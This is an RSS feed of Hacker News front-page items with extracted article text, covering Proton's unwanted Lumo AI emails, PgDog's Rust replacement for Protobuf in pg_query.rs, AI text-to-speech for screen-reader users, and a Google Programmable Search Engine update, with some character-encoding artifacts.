<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Fri, 23 Jan 2026 18:55:10 +0000</lastBuildDate><item><title>Proton Spam and the AI Consent Problem</title><link>https://dbushell.com/2026/01/22/proton-spam/</link><description>&lt;doc fingerprint="fe5780134ea23fcf"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Proton Spam and the AI Consent Problem&lt;/head&gt;
    &lt;p&gt;On Jan 14th Proton sent out an email newsletter with the subject line:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Introducing Projects - Try Lumo√¢s powerful new feature now&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Lumo is Proton√¢s &lt;/p&gt;
    &lt;p&gt;There is a problem with this email. And I√¢m not talking about the question of how exactly AI aligns with Proton√¢s core values of privacy and security.&lt;/p&gt;
    &lt;p&gt;The problem is I had already explicitly opted out of Lumo emails.&lt;/p&gt;
    &lt;p&gt;That toggle for √¢Lumo product updates√¢ is unchecked. Lumo is the only topic I√¢m not subscribed to. Proton has over a dozen newsletters, including some crypto nonsense. I opt-in to everything but Lumo, I gave an undeniable no to Lumo emails.&lt;/p&gt;
    &lt;p&gt;So the email I received from Proton is spam, right?&lt;/p&gt;
    &lt;p&gt;My understanding is that spam is a violation of GDPR and UK data protection laws. Regardless, Proton√¢s email is a clear abuse of their own service towards a paying business customer.&lt;/p&gt;
    &lt;p&gt;Before I grab my pitchfork I emailed Proton support.&lt;/p&gt;
    &lt;head rend="h2"&gt;Proton Support&lt;/head&gt;
    &lt;p&gt;Despite the subject line and contents, and despite the √¢From Lumo√¢ name and &lt;code&gt;@lumo.proton.me&lt;/code&gt; address, maybe this was an honest mistake?&lt;/p&gt;
    &lt;p&gt;Proton√¢s first reply explained how to opt-out.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Hello David,&lt;/p&gt;
      &lt;p&gt;Thank you for contacting us.&lt;/p&gt;
      &lt;p&gt;You can unsubscribe from the newsletters if you do the following:&lt;/p&gt;
      &lt;p&gt;- Log in to your account at https://account.protonvpn.com/login&lt;/p&gt;
      &lt;p&gt;- Navigate to the Account category&lt;/p&gt;
      &lt;p&gt;- Disable the check-marks under √¢Email subscriptions√¢&lt;/p&gt;
      &lt;p&gt;- If you need additional assistance, let me know.&lt;/p&gt;
      &lt;p&gt;[screenshot of the same opt-out toggle]&lt;/p&gt;
      &lt;p&gt;-Have a nice day.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;John Support directs me to the exact same √¢Lumo product updates√¢ toggle I had already unchecked. I replied explaining that I had already opted out. Support replies saying they√¢re √¢checking this with the team√¢ then later replies again asking for screenshots.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Can you make sure to send me a screenshot of this newsletter option disabled, as well as the date when the last message was sent to you regarding the Lumo offer?&lt;/p&gt;
      &lt;p&gt;You can send me a screenshot of the whole message, including the date.&lt;/p&gt;
      &lt;p&gt;Is it perhaps 14 January 2026 that you received the message?&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;I found that last line curious, are they dealing with other unhappy customers? Maybe I√¢m reading too much into it.&lt;/p&gt;
    &lt;p&gt;I sent the screenshots and signed off with √¢Don√¢t try to pretend this fits into another newsletter category.√¢&lt;/p&gt;
    &lt;p&gt;After more √¢checking this with the team√¢ I got a response today.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;In this case, the mentioned newsletter is for promoting Lumo Business Suit to Business-related plans.&lt;/p&gt;
      &lt;p&gt;Hence, why you received it, as Product Updates and Email Subscription are two different things.&lt;/p&gt;
      &lt;p&gt;In the subscription section, you will see the √¢Email Subscription√¢ category, where you can disable the newsletter in order to avoid getting it in the future.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;If I understand correctly, Proton are claiming this email is the √¢Proton for Business newsletter√¢. Not the √¢Lumo product updates√¢ newsletter.&lt;/p&gt;
    &lt;p&gt;I don√¢t know about you, but I think that√¢s baloney. Proton Support had five full business days to come up with a better excuse. Please tell me, how can I have been any more explicit about opting out of Lumo emails, only to receive √¢Try Lumo√¢ √¢From Lumo√¢, and be told that is not actually a Lumo email?&lt;/p&gt;
    &lt;head rend="h2"&gt;Non-Consent&lt;/head&gt;
    &lt;p&gt;Has anyone else noticed that the AI industry can√¢t take √¢no√¢ for an answer? AI is being force-fed into every corner of tech. It√¢s unfathomable to them that some of us aren√¢t interested.&lt;/p&gt;
    &lt;p&gt;The entire AI industry is built upon a common principle of non-consent. They laugh in the face of IP and copyright law. AI bots DDoS websites and lie about user-agents. Can it get worse than the sickening actions of Grok? I dread to think.&lt;/p&gt;
    &lt;p&gt;As Proton has demonstrated above, and Mozilla/Firefox recently too, the AI industry simply will not accept √¢no√¢ as an answer. Some examples like spam are more trivial than others, but the growing trend is vile and disturbing.&lt;/p&gt;
    &lt;p&gt;I do not want your AI.&lt;/p&gt;
    &lt;p&gt;Scroll past the GitHub aside for another Proton update!&lt;/p&gt;
    &lt;head rend="h3"&gt;Update for 23rd January&lt;/head&gt;
    &lt;p&gt;I guess someone at Microsoft read my post and said √¢hold my beer√¢. This morning I woke up to a lovely gift in my inbox; √¢Build Al agents with the new GitHub Copilot SDK√¢.&lt;/p&gt;
    &lt;p&gt;GitHub Ensloppification is moving faster than I can delete my account for good. (It√¢s an unfortunate requirement for client projects.) For the record, I have never said √¢yes√¢ to any GitHub newsletter. Even before Copilot I disabled every possible GitHub email notification.&lt;/p&gt;
    &lt;p&gt;The √¢Unsubscribe√¢ link provides the hidden newsletter list. There is nothing within GitHub account settings I can find to disable spam.&lt;/p&gt;
    &lt;p&gt;As expected, Microsoft has opted me in without my consent. The wheels are falling off at GitHub. The brutally slow front-end UI. The embarrassingly lacklustre Actions CI. Now this sloppy tripe everywhere. Reminder to developers: GitHub is not Git.&lt;/p&gt;
    &lt;head rend="h2"&gt;Proton Update (Afternoon of 23rd)&lt;/head&gt;
    &lt;p&gt;After I published this blog post yesterday I received another email from Specialist Support / Mail Delivery (Engineering) Team.&lt;/p&gt;
    &lt;p&gt;The email started:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;I completely understand your frustration, and I apologize for the confusion caused by these Overlapping Categories of notifications.&lt;/p&gt;&lt;p&gt;Specifically, some of our communications regarding Lumo fall under Both&lt;/p&gt;&lt;code&gt;Product Updates&lt;/code&gt;(Update Info) and&lt;code&gt;Email Subscriptions&lt;/code&gt;(Announcements, Newsletters, and Promos) This is likely why you are still receiving them despite having opted out of one category.&lt;/quote&gt;
    &lt;p&gt;I replied saying that is not how email marketing consent works. I√¢m pretty sure not legally, I√¢m certain not morally, and until now, I was convinced not by Proton√¢s standard. The very first customer support confirmed what should be common sense. Don√¢t want Lumo emails? Unsubscribe from the √¢Lumo product updates√¢ category. If it was a business newsletter that happened to mention Lumo as a bullet point, fine. But the entire email was Lumo, talking about how √¢Our latest Lumo update introduces√¢¬¶√¢&lt;/p&gt;
    &lt;p&gt;Anyway, following a lively discussion on Big Tech√¢s unofficial customer support forum, my case was escalated to Proton√¢s Head of Customer Support.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Please accept my apologies for how your ticket was managed by our teams. They have tried to explain what happened without acknowledging the problem itself.&lt;/p&gt;
      &lt;p&gt;You are right. You should not have received the newsletter.&lt;/p&gt;
      &lt;p&gt;We have identified a bug in our system, and our technical team is working on resolving it.&lt;/p&gt;
      &lt;p&gt;I want to assure you that we take communication consent very seriously.&lt;/p&gt;
      &lt;p&gt;We also value our relationship with our customers. The support team will learn from this interaction and improve.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Just FYI I don√¢t have a problem with how the support ticket was managed. I doubt the first line of defence gets paid enough to deal with this stuff when their employer is at fault. Please don√¢t replace them with Lumo, then we√¢ll have problems!&lt;/p&gt;
    &lt;p&gt;I also see Proton√¢s CTO replied on Hacker News with a similar message:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Hey, Proton CTO here. There was a bug, and we fucked up. Support should have reported it up the chain and acknowledged this. Things happen, especially at scale, but we take comms consent seriously and will fix it.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;So was it a bug? Or did Proton forget their core values and behave like the other slop factories? I√¢ll take them at their word. What am I going to do, go back to gmail? I√¢m looking into Tuta and StartMail but it√¢s a pain to switch and nowhere is perfect.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46729368</guid><pubDate>Fri, 23 Jan 2026 07:01:29 +0000</pubDate></item><item><title>Replacing Protobuf with Rust to go 5 times faster</title><link>https://pgdog.dev/blog/replace-protobuf-with-rust</link><description>&lt;doc fingerprint="ae1a93792c310158"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Replacing Protobuf with Rust to go 5 times faster&lt;/head&gt;
    &lt;p&gt;Jan 22nd, 2026&lt;lb/&gt;Lev Kokotov&lt;/p&gt;
    &lt;p&gt;PgDog is a proxy for scaling PostgreSQL. Under the hood, we use &lt;code&gt;libpg_query&lt;/code&gt; to parse and understand SQL queries. Since PgDog is written in Rust, we use its Rust bindings to interface with the core C library. 
Those bindings use Protobuf (de)serialization to work uniformly across different programming languages, e.g., the popular Ruby pg_query gem.&lt;/p&gt;
    &lt;p&gt;Protobuf is fast, but not using Protobuf is faster. We forked pg_query.rs and replaced Protobuf with direct C-to-Rust (and back to C) bindings, using bindgen and Claude-generated wrappers. This resulted in a 5x improvement in parsing queries, and a 10x improvement in deparsing (Postgres AST to SQL string conversion).&lt;/p&gt;
    &lt;head rend="h5"&gt;Results&lt;/head&gt;
    &lt;p&gt;You can reproduce these by cloning our fork and running the benchmark tests:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Function&lt;/cell&gt;
        &lt;cell role="head"&gt;Queries per second&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;&lt;code&gt;pg_query::parse&lt;/code&gt; (Protobuf)&lt;/cell&gt;
        &lt;cell&gt;613&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;&lt;code&gt;pg_query::parse_raw&lt;/code&gt; (Direct C to Rust)&lt;/cell&gt;
        &lt;cell&gt;3357 (5.45x faster)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;&lt;code&gt;pg_query::deparse&lt;/code&gt; (Protobuf)&lt;/cell&gt;
        &lt;cell&gt;759&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;&lt;code&gt;pg_query::deparse_raw&lt;/code&gt; (Direct Rust to C)&lt;/cell&gt;
        &lt;cell&gt;7319 (9.64x faster)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h3"&gt;The process&lt;/head&gt;
    &lt;p&gt;The first step is always profiling. We use samply, which integrates nicely with the Firefox profiler. Samply is a sampling profiler: it measures how much time code spends running CPU instructions in each function. It works by inspecting the application call stack thousands of times per second. The more time is spent inside a particular function (or span, as they are typically called), the slower that code is. This is how we discovered &lt;code&gt;pg_query_parse_protobuf&lt;/code&gt;:&lt;/p&gt;
    &lt;p&gt;This is the entrypoint to the &lt;code&gt;libpg_query&lt;/code&gt; C library, used by all pg_query bindings. The function that wraps the actual Postgres parser, &lt;code&gt;pg_query_raw_parse&lt;/code&gt;, barely registered on the flame graph. Parsing queries isn‚Äôt free, but the Postgres parser itself is very quick and has been optimized for a long time. With the hot spot identified, our first instinct was to do nothing and just add a cache.&lt;/p&gt;
    &lt;head rend="h4"&gt;Caching mostly works&lt;/head&gt;
    &lt;p&gt;Caching is a trade-off between memory and CPU utilization, and memory is relatively cheap (latest DRAM crunch notwithstanding). The cache is mutex-protected, uses the LRU algorithm and is backed by a hashmap1. The query text is the key and the Abstract Syntax Tree is the value, which expects most apps to use prepared statements. The query text contains placeholders instead of actual values and is therefore reusable, for example:&lt;/p&gt;
    &lt;code&gt;SELECT * FROM users WHERE id = $1;
&lt;/code&gt;
    &lt;p&gt;While the &lt;code&gt;id&lt;/code&gt; parameter can change between invocations, the prepared statement does not, so we could cache its static AST in memory.&lt;/p&gt;
    &lt;p&gt;This works pretty well, but eventually we ran into a couple of issues:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Some ORMs can have bugs that generate thousands of unique statements, e.g., &lt;code&gt;value IN ($1, $2, $3)&lt;/code&gt;instead of&lt;code&gt;value = ANY($1)&lt;/code&gt;, which causes a lot of cache misses&lt;/item&gt;
      &lt;item&gt;Applications use old PostgreSQL client drivers which don‚Äôt support prepared statements, e.g., Python‚Äôs &lt;code&gt;psycopg2&lt;/code&gt;package&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The clock on Protobuf was ticking and we needed to act. So, like a lot of engineers these days, we asked an LLM to just do it for us.&lt;/p&gt;
    &lt;head rend="h4"&gt;Tight constraints&lt;/head&gt;
    &lt;p&gt;I‚Äôm going to preface this section by saying that the vast majority of PgDog‚Äôs source code is written by a human. AI is not in a position to one-shot a connection pooler, load balancer and database sharder. However, when scoped to a very specific, well-defined and most importantly machine-verifiable task, it can work really well.&lt;/p&gt;
    &lt;p&gt;The prompt we started with was pretty straightforward:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;libpg_query is a library that wraps the PostgreSQL parser in an API. pg_query.rs is a Rust wrapper around libpg_query which uses Protobuf for (de)serialization. Replace Protobuf with bindgen-generated Rust structs that map directly to the Postgres AST.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;And after two days of back and forth between us and the machine, it worked. We ended up with 6,000 lines of recursive Rust that manually mapped C types and structs to Rust structs, and vice versa. We made the switch for &lt;code&gt;parse&lt;/code&gt;, &lt;code&gt;deparse&lt;/code&gt; (used in our new query rewrite engine, which we‚Äôll talk about in another post), &lt;code&gt;fingerprint&lt;/code&gt; and &lt;code&gt;scan&lt;/code&gt;. These four methods are heavily used in PgDog to make sharding work, and we immediately saw a 25% improvement in pgbench benchmarks2.&lt;/p&gt;
    &lt;p&gt;Just to be clear: we had a lot of things going for us already that made this possible. First, pg_query has a Protobuf spec for protoc (and Prost, the Protobuf Rust implementation) to generate bindings, so Claude was able to get a comprehensive list of structs it needed to extract from C, along with the expected data types.&lt;/p&gt;
    &lt;p&gt;Second, pg_query.rs was already using bindgen, so we had to just copy/paste some invocations around to get the AST structs included in bindgen‚Äôs output.&lt;/p&gt;
    &lt;p&gt;And last, and definitely not least, pg_query.rs already had a working &lt;code&gt;parse&lt;/code&gt; and &lt;code&gt;deparse&lt;/code&gt; implementation, so we could test our AI-generated code against its output. This was entirely automated and verifiable: for each test case that used &lt;code&gt;parse&lt;/code&gt;, we included a call to &lt;code&gt;parse_raw&lt;/code&gt;, compared their results and if they differed by even one byte, Claude Code had to go back and try again.&lt;/p&gt;
    &lt;head rend="h4"&gt;The implementation&lt;/head&gt;
    &lt;p&gt;The translation code between Rust and C uses &lt;code&gt;unsafe&lt;/code&gt; Rust functions that wrap Rust structs to C structs. The C structs are then passed to the Postgres/libpg_query C API which does the actual work of building the AST.&lt;/p&gt;
    &lt;p&gt;The result is converted back to Rust using a recursive algorithm: each node in the AST has its own converter function which accepts an &lt;code&gt;unsafe&lt;/code&gt; C pointer and returns a safe Rust struct. Much like the name suggests, the AST is a tree, which is stored in an array:&lt;/p&gt;
    &lt;code&gt;unsafe fn convert_list_to_raw_stmts(
    list: *mut bindings_raw::List
) -&amp;gt; Vec&amp;lt;protobuf::RawStmt&amp;gt; {
    // C-to-Rust conversion.
}
&lt;/code&gt;
    &lt;p&gt;For each node in the list, the implementation calls &lt;code&gt;convert_node&lt;/code&gt;, which then handles each one of the 100s of tokens available in the SQL grammar:&lt;/p&gt;
    &lt;code&gt;unsafe fn convert_node(
    node_ptr: *mut bindings_raw::Node
) -&amp;gt; Option&amp;lt;protobuf::Node&amp;gt; {
    // This is basically C in Rust, so we better check for nulls!
    if node_ptr.is_null() {
        return None;
    }

    match (*node_ptr).type_ {
        // SELECT statement root node.
        bindings_raw::NodeTag_T_SelectStmt =&amp;gt; {
            let stmt = node_ptr as *mut bindings_raw::SelectStmt;
            Some(protobuf::node::Node::SelectStmt(Box::new(convert_select_stmt(&amp;amp;*stmt))))
        }
        
        // INSERT statement root node.
        bindings_raw::NodeTag_T_InsertStmt =&amp;gt; {
            let stmt = node_ptr as *mut bindings_raw::InsertStmt;
            Some(protobuf::node::Node::InsertStmt(Box::new(convert_insert_stmt(&amp;amp;*stmt))))
        }
        
        // ... 100s more nodes.
    }
}
&lt;/code&gt;
    &lt;p&gt;For nodes that contain other nodes, we recurse on &lt;code&gt;convert_node&lt;/code&gt; again until the algorithm reaches the leaves (nodes with no children) and terminates. For nodes that contain scalars, like a number (e.g., &lt;code&gt;5&lt;/code&gt;) or text (e.g., &lt;code&gt;'hello world'&lt;/code&gt;), the data type is copied into a Rust analog, e.g., &lt;code&gt;i32&lt;/code&gt; or &lt;code&gt;String&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;The end result is &lt;code&gt;protobuf::ParseResult&lt;/code&gt;, a Rust struct generated by Prost from the pg_query API Protobuf specification, but populated by native Rust code instead of Prost‚Äôs deserializer. Reusing existing structs reduces the chance of errors considerably: we can compare &lt;code&gt;parse&lt;/code&gt; and &lt;code&gt;parse_raw&lt;/code&gt; outputs, using the derived &lt;code&gt;PartialEq&lt;/code&gt; trait, and ensure that both are identical, in testing.&lt;/p&gt;
    &lt;p&gt;While recursive algorithms have a questionable reputation in the industry because bad ones can cause stack overflows, they are very fast. Recursion requires no additional memory allocation because all of its working space, the stack, is created on program startup. It also has excellent CPU cache locality because the instructions for the next invocation of the same function are already in the CPU L1/L2/L3 cache. Finally and arguably more importantly, they are just easier to read and understand than iterative implementations, which helps us, the humans, with debugging.&lt;/p&gt;
    &lt;p&gt;Just for good measure, we tried generating an iterative algorithm, but it ended up being slower than Prost. The main cause (we think) was unnecessary memory allocations, hashmap lookups of previously converted nodes, and too much overhead from walking the tree several times. Meanwhile, recursion processes each AST node exactly once and uses the stack pointer to track its position in the tree. If you have any ideas on how to make an iterative algorithm work better, let us know!&lt;/p&gt;
    &lt;head rend="h3"&gt;Closing thoughts&lt;/head&gt;
    &lt;p&gt;Reducing the overhead from using the Postgres parser in PgDog makes a huge difference for us. As a network proxy, our budget for latency, memory utilization, and CPU cycles is low. After all, we aren‚Äôt a real database‚Ä¶yet! This change improves performance from two angles: we use less CPU and we do less work, so PgDog is faster and cheaper to run.&lt;/p&gt;
    &lt;p&gt;If stuff like this is interesting to you, reach out. We are looking for a Founding Software Engineer to help us grow and build the next iteration of horizontal scaling for PostgreSQL.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46730214</guid><pubDate>Fri, 23 Jan 2026 09:03:31 +0000</pubDate></item><item><title>The state of modern AI text to speech systems for screen reader users</title><link>https://stuff.interfree.ca/2026/01/05/ai-tts-for-screenreaders.html</link><description>&lt;doc fingerprint="85deb33a0b1ab384"&gt;
  &lt;main&gt;
    &lt;p&gt;If you're not a screen reader user yourself, you might be surprised to learn that the text to speech technology used by most blind people hasn't changed in the last 30 years. While text to speech has taken the sighted world by storm, in everything from personal assistants to GPS to telephone systems, the voices used by blind folks have remained mostly static. This is largely intentional. The needs of a blind text to speech user are vastly different than those of a sighted user. While sighted users prefer voices that are natural, conversational, and as human-like as possible, blind users tend to prefer voices that are fast, clear, predictable, and efficient. This results in a preference among blind users for voices that sound somewhat robotic, but can be understood at high rates of speed, often upwards of 800 to 900 words per minute. The speaking rate of an average person hovers around 200 to 250 words per minute, for comparison.&lt;/p&gt;
    &lt;p&gt;Unfortunately, this difference in needs has resulted in blind people getting left out of the explosion of text to speech advancement, and has caused many problems. First, the voice that is preferred by the majority of western English blind users, called Eloquence, was last updated in 2003. While it is so overwhelmingly popular that even Apple was eventually pressured to add the voice to iPhone, mac, Apple TV, and Apple Watch, even they were forced to use an emulation layer. As Eloquence is a 32-bit voice last compiled in 2003, it cannot run in modern software without some sort of emulation or bridge. If the sourcecode to Eloquence still exists and can be compiled, even large companies like Apple haven't managed to find or compile it. As the NVDA screen reader moves from being a 32-bit application to a 64-bit one, keeping eloquence running with it has been a challenge that I and many other community members have spent a lot of time and effort solving. The eloquence libraries also have many known security issues, and anyone using the libraries today is forced to understand and program around them, as Eloquence itself can never be updated or fixed. These stopgap solutions are entirely untenable, and are likely to take us only so far. A better solution is urgently needed.&lt;/p&gt;
    &lt;p&gt;The second problem this has caused is for those who speak languages other than English. As most modern text to speech voices are created by and for sighted users, blind users begin to find that the voices available in less popular languages are inefficient, overly conversational, slow, and otherwise unsatisfactory. While espeak-ng is an open-source text to speech system that attempts to support hundreds of languages while meeting the needs of blind users, it brings a different set of problems to the table. First, many of the languages it supports were added based on pronunciation rules taken from Wikipedia articles, without involving speakers of the language. Second, Espeak-ng is based directly on Speak, a text to speech system written by Jonathan Duddington in 1995 for RISC OS on the BBC Micro, meaning that espeak users today continue to have to live with many of the design decisions made back in 1995 for an operating system that no longer exists. Third, looking at the Espeak-ng repository, it seems to only have one or two active maintainers. While this is obviously better than the zero active maintainers of Eloquence, it could still become a problem in the future.&lt;/p&gt;
    &lt;p&gt;These are the reasons that I'm always interested in advancements in text to speech, and am actively keeping my ears open for something that takes advantage of modern technology, while continuing to suit the needs of screen reader users like myself.&lt;/p&gt;
    &lt;p&gt;Over the holiday break, I decided to take a look at two modern AI-based text to speech systems, and see if they could be added to NVDA. I chose two models, because they advertised themselves as fast, able to run without a GPU, and responsive. The first was supertonic, and the second was Kitten TTS. As both models require 64-bit Python, I wrote the addons for the 64-bit alpha of NVDA. However, other than making development easier, this had little effect on the results.&lt;/p&gt;
    &lt;p&gt;Unfortunately, doing this work uncovered a number of issues that I believe are common to all of the modern AI-based text to speech systems, and make them unsuitable for use in screen readers. The first issue is dependency bloat. In order to bundle these systems as NVDA addons, developers are required to include a vast multitude of large and complex Python packages. In the case of Kitten TTS, the number is around 103, and just over 30 for supertonic. As the standard building and packaging methods for NVDA addons do not support specifying and building requirements, these dependencies need to be manually copied over, included in any github repositories, and cannot be automatically updated. Loading all of these dependencies directly into NVDA also causes the screen reader to load slower, use more system resources, and opens NVDA users up to any security issue in any of these libraries. As a screen reader needs access to the entire system, this is far from ideal.&lt;/p&gt;
    &lt;p&gt;The second issue is accuracy. These modern systems are developed to sound human, natural, and conversational. Unfortunately this seems to come at the expense of accuracy. In my testing, both models had a tendency to skip words, read numbers incorrectly, chop off short utterances, and ignore prosody hints from text punctuation. Kitten TTS is slightly better here, as it uses a deterministic phonemizer (the same one used by espeak, actually) to determine the correct way to pronounce words, leaving only the generation of the speech itself up to AI. But never the less, Kitten TTS is still far from perfectly accurate. When it comes to use in a screen reader, skipping words, or reading numbers incorrectly, is unacceptable.&lt;/p&gt;
    &lt;p&gt;The third issue is speed. Supertonic has the edge, here, but even it is far too slow. Unlike older text to speech systems, Supertonic and Kitten TTS cannot begin generating speech until they have an entire chunk of text. Supertonic is slightly faster, as it can stream result audio as it becomes available, whereas Kitten TTS cannot start speaking until all of the audio for the chunk is fully generated. But for use in a screen reader, a text to speech system needs to begin generating speech as quickly as possible, rather than waiting for an entire phrase or sentence. Users of screen readers quickly jump through text and frequently interrupt the screen reader, and thus require the text to speech system to be able to quickly discard and restart speech.&lt;/p&gt;
    &lt;p&gt;The fourth and final issue is control. Older text to speech systems make changing the pitch, speed, volume, breathiness, roughness, headsize, and other parameters of the voice easy. This allows screen reader users to customize the voice to our exact needs, as well as offering the ability to change the characteristics of the voice in real time based on the formatting or other attributes of the text. AI text to speech models, being trained on data from a particular set of speakers, cannot offer this customization. Instead, they inherit the speaking speed, pitch, volume, and other characteristics that were present in the training data. Kitten TTS and Supertonic both offer basic speed control, however it is highly variable from voice to voice and utterance to utterance. This leads to a loss of functionality that many blind users depend on.&lt;/p&gt;
    &lt;p&gt;If you'd like to experience these issues for yourself, feel free to follow the links above to my GitHub repositories. They offer ready to install addons that can be installed and used with the 64-bit NVDA alphas.&lt;/p&gt;
    &lt;p&gt;I'm picking on Kitten TTS and Supertonic not because they're particularly bad for the above problems, but because they're the models that are the state of the art in AI text to speech right now when it comes to speed and size. Other models, like Kokoro, exhibit all of the same issues, but more so.&lt;/p&gt;
    &lt;p&gt;So what's the way forward for blind screen reader users? Sadly, I don't know. Modern text to speech research has little to no overlap with our requirements. Using Eloquence, the system that many blind people find best, is becoming increasingly untenable. ESpeak uses an odd architecture originally designed for computers in 1995, and has few maintainers. Blastbay Studios has done some interesting work to create a text to speech voice using modern design and technology, that meets the requirements of blind users. But it's a closed-source product with a single maintainer, that also suffers from a lack of pronunciation accuracy. In an ideal world, someone would re-implement Eloquence as a set of open source libraries. However, doing so would require expertise in linguistics, digital signal processing, and audiology, as well as excellent programming abilities. My suspicion is that modernizing the text to speech stack that is preferred by blind power-users is an effort that would require several million dollars of funding at minimum. Instead, we'll probably wind up having to settle for text to speech voices that are "good enough", while being nowhere near as fast and efficient as what we have currently. Personally, I intend to keep Eloquence limping along for as long as I can, until the layers of required emulation and bridges make real time use impossible. Perhaps at that point AI will be good enough that it can be prompted to create a text to speech system that's up to our standards. Or, more hopefully, articles like this one may bring attention to the issues, and bring our community together to recognize the problems and find solutions.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46730346</guid><pubDate>Fri, 23 Jan 2026 09:24:27 +0000</pubDate></item><item><title>Updates to our web search products and  Programmable Search Engine capabilities</title><link>https://programmablesearchengine.googleblog.com/2026/01/updates-to-our-web-search-products.html</link><description>&lt;doc fingerprint="da81bed20394e73a"&gt;
  &lt;main&gt;
    &lt;p&gt;Evolving Programmable Search Engine&lt;/p&gt;
    &lt;p&gt;Programmable Search Engine helps hundreds of partners ‚Äì from academic institutions to retail websites ‚Äì serve their users‚Äô search needs on their sites.&lt;/p&gt;
    &lt;p&gt;Looking forward, we‚Äôll be evolving our offerings to provide more focused and capable solutions for every use case. This evolution is designed to ensure a high-quality experience for users and partners.&lt;/p&gt;
    &lt;p&gt;A clearer path for every search need&lt;/p&gt;
    &lt;p&gt;We're simplifying and modernizing our offerings so you can choose the best tool for your goals.&lt;/p&gt;
    &lt;p&gt;For site-specific search: The Programmable Search Element (the ‚ÄúSearch Element‚Äù) is being simplified to be the best tool for creating rich, focused search experiences on your own websites. This solution is intended for website owners who cater focused content to a specific audience.&lt;/p&gt;
    &lt;p&gt;For enterprise-grade needs: For advanced features like AI-powered conversational search and enterprise-grade grounding, we continue to offer Google Vertex AI Search as a solution.&lt;/p&gt;
    &lt;p&gt;For full web search needs: We understand some partners have use cases that require querying beyond a designated subset of domains. Our full web search solution is available for those requiring our entire index; please complete this form to register your interest .&lt;/p&gt;
    &lt;p&gt;Planning your transition to more powerful tools&lt;/p&gt;
    &lt;p&gt;We are excited to help you harness the full potential of these evolving solutions. As you plan for the future, here is your path forward for the transition, which can be completed any time between now and January 1, 2027.&lt;/p&gt;
    &lt;p&gt;‚ÄúSites to search‚Äù feature for users of the Search Element querying 50 or fewer domains: The Search Element remains the optimal solution for delivering highly optimized and focused results. With this free feature, you can designate a maximum number of 50 domains for site-specific searches.&lt;/p&gt;
    &lt;p&gt;‚ÄúSearch the entire web‚Äù option for users of the Search Element querying more than 50 domains: If your use case necessitates querying more than 50 domains or is set to ‚ÄúSearch the entire web‚Äù, contact us to express your interest in the more advanced full web search solution and get more information about its capabilities and pricing. Your transition to an alternative solution needs to be completed by January 1, 2027.&lt;/p&gt;
    &lt;p&gt;For users of the Custom Search JSON API: Vertex AI Search is a favorable alternative for up to 50 domains. Alternatively, if your use case necessitates full web search, contact us to express your interest in and get more information about our full web search solution. Your transition to an alternative solution needs to be completed by January 1, 2027.&lt;/p&gt;
    &lt;p&gt;To prepare for this transition, as of today, all new engines must be configured to use the ‚ÄúSites to search‚Äù feature. This change impacts only new engines; existing engines are not affected and can continue to use the ‚ÄúSearch the entire web‚Äù option until January 1, 2027.&lt;/p&gt;
    &lt;p&gt;This evolution will help us create more focused products, so we can provide a better search experience for our developer partners. We‚Äôre excited to build the future of search with you.&lt;/p&gt;
    &lt;p&gt;Thank you,&lt;/p&gt;
    &lt;p&gt;The Google Programmable Search Engine Team&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46730436</guid><pubDate>Fri, 23 Jan 2026 09:38:02 +0000</pubDate></item><item><title>AI Usage Policy</title><link>https://github.com/ghostty-org/ghostty/blob/main/AI_POLICY.md</link><description>&lt;doc fingerprint="eb7ad05e09566404"&gt;
  &lt;main&gt;
    &lt;p&gt;We read every piece of feedback, and take your input very seriously.&lt;/p&gt;
    &lt;p&gt;To see all available qualifiers, see our documentation.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
